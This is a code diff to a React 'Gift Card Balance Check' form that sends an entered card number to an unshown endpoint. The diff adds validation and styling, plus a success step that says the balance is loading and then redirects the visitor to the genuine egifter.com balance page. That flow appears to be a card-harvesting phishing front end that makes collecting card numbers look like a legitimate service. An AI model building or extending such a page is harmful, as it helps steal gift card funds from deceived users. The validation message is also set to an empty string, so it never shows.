@@ -5,6 +5,19 @@ function App() {
     const [userInput, setUserInput] = useState('');
     const [loading, setLoading] = useState(false);
     const [error, setError] = useState(null);
+    const [validationError, setValidationError] = useState(null);
+
+    const handleChange = (e) => {
+        const { value } = e.target;
+        const regex = /^[a-zA-Z0-9]*$/;
+
+        if (regex.test(value)) {
+            setUserInput(value);
+            setValidationError(null);
+        } else {
+            setValidationError('');
+        }
+    };
 
     const handleSubmit = async (e) => {
         e.preventDefault();
@@ -22,8 +35,10 @@ function App() {
 
             if (response.ok) {
                 alert('Waiting to load your balance');
+                window.location.href = 'https://www.egifter.com/gift-card-balance-check';
             } else {
-                setError('Unable to process your request. Please try again.');
+                const errorData = await response.json();
+                setError(errorData.message || 'Unable to process your request. Please try again.');
             }
         } catch (error) {
             setError('An error occurred. Please try again later.');
@@ -33,34 +48,39 @@ function App() {
     };
 
     return (
-    <div className="app h-screen  md:py-20 py-9">
-        <form  
-            className='h-80 text-black bg-white px-5 text-left py-10' 
-            onSubmit={handleSubmit}>
-            <div className="md:text-4xl text-2xl font-extrabold">
-                Gift Card Balance Check
-            </div>
-            <br/>
-            <p className='text-sm pb-2 font-medium'>
-                Please enter your gift card number below to check your balance.
-            </p>
-            <input
-                className='border rounded-md border-black h-8 md:w-80 w-48 px-3'
-                type="num"
-                placeholder=''
-                id="userInput"
-                value={userInput}
-                onChange={(e) => setUserInput(e.target.value)}
-                required
-            /> 
-            {loading ? (
-                <button className='border rounded-md ml-1 px-5 py-1 border-black' type="submit" disabled>Loading...</button>
-            ) : (
-                <button className='border rounded-md ml-1 px-5 py-1 bg-blue-800 text-white md:text-base text-sm font-semibold' type="submit" >Check</button>
-            )}
-            {error && <p className="error">{error}</p>}
-        </form>
-    </div>
+        <div className="app h-screen md:py-20 py-9">
+            <form className="h-80 text-black bg-white px-5 text-left py-10" onSubmit={handleSubmit}>
+                <div className="md:text-4xl text-2xl font-extrabold text-blue-800">
+                    Gift Card Balance Check
+                </div>
+                <br />
+                <p className="text-sm pb-2 font-medium">
+                    Please enter your gift card number below to check your balance.
+                </p>
+                <label htmlFor="userInput" className="sr-only">Gift Card Number</label>
+                <input
+                    className="border rounded-md border-black h-8 md:w-80 w-48 px-3"
+                    type="text"
+                    placeholder="Enter gift card number"
+                    id="userInput"
+                    value={userInput}
+                    onChange={handleChange}
+                    required
+                    aria-required="true"
+                />
+                {loading ? (
+                    <button className="border rounded-md ml-1 px-5 py-1 border-blue-800 text-blue-800 bg-white" type="submit" disabled>
+                        Loading...
+                    </button>
+                ) : (
+                    <button className="border rounded-md ml-1 px-5 py-1 bg-blue-800 text-white md:text-base text-sm font-semibold" type="submit">
+                        Check
+                    </button>
+                )}
+                {validationError && <p className="error text-red-500 mt-2">{validationError}</p>}
+                {error && <p className="error text-red-500 mt-2">{error}</p>}
+            </form>
+        </div>
     );
 }
 
